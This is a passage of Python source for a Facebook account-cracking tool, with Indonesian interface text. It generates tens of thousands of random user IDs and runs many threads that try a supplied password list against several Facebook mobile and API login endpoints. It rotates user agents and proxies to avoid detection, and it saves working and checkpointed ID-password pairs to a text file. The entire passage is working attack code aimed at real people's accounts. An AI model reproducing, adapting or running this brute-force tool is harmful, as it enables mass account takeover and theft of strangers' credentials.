			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_free3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def free3(self, uid, pwx):
		nip=random.choice(prox)
		rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_basic3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def basic3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
		
	def old_bapi3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def bapi3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
			
	def pilihmetod2(self):
		print("")
		print("%s [1] 2008-09 + Cloning + methode mbasic"%(P))
		print(" %s[2] 2008-09 + Cloning + methode bapi"%(P))
		print("%s [3] 2008-09 + Cloning + methode free"%(P))
		print(" %s[4] 2008-09 + Cloning + methode touch"%(P))
		print("%s [5] 2008-09 + Cloning + methode mobile"%(P))
		print(" %s[6] 2008-09 + Cloning + methode IPhone"%(P))
		print("%s [7] 2008-09 + Cloning + methode x facebook"%(P))
		print(" %s[8] 2008-09 + Cloning + methode graph [ %sTidak Ada Pembaruan %s]"%(P,M,P))
		Mat =input(" %sChoose : "%(P))
		if Mat in ["1", "01"]:
			self.old_basic2()
		if Mat in ["2", "02"]:
			self.old_bapi2()
		if Mat in ["3", "03"]:
			self.old_free2()
		if Mat in ["4", "04"]:
			self.old_touch2()
		if Mat in ["5", "05"]:
			self.old_mobile2()
		if Mat in ["6", "06"]:
			self.old_iphone2()
		if Mat in ["7", "07"]:
			self.old_xfacebook2()
		if Mat in ["8", "08"]:
			self.old_graph()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			pilihmetod2()
	
	def old_xfacebook2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def xfacebook2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s \x1b[38;5;231m<─> %s%s %s•%s 2007%s <─> %s2008"%(K,uid,K,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_iphone2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def iphone2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://IPhone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://IPhone.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_mobile2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.mobile2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def mobile2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
